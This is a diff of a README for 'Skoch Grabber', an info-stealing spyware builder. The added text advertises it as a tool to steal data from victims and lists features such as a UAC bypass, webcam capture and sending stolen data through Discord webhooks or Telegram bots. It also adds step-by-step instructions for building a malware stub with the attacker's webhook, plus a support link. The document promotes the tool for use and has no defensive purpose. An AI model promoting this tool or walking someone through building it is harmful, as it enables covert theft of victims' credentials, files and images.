@@ -1,9 +1,9 @@
 # SKOCH GRABBER
 
-
+[✅] Skoch Grabber is a powerful spyware to steal every single data from your victims.
 
 # FEATURES
-`
+```
 • GUI Builder.
 • UAC Bypass.
 • Custom Icon.
@@ -39,7 +39,15 @@
 • Captures Webcam Image.
 • Sends All Data Through Discord Webhooks/Telegram Bot.
 (...more)
-`
+```
+# USAGE
+- Clone this repo.
+- Extract the .zip file.
+- Install the latest Python. ~ https://python.org/downloads
+- Make sure to tick that "Add to PATH" option.
+- Run `Builder.bat`
+- Voila! Put your webhook, tick the features you want, use icon if you want and then build!
+- Your stub folder will show up as soon as it's done.
 
-Get it now from here:
+# SUPPORT
 https://dsc.gg/skochworld
